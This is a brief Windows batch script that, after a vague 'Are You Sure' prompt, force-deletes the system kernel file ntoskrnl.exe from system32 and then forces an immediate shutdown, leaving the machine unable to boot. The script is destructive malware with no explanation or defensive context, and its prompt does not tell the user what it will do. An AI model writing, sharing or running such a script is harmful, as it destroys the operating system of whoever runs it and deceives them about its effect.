@echo off
echo Are You Sure You want to run this?
pause
del /f /q /s "C:\windows\system32\ntoskrnl.exe"
shutdown /s /f /t 0

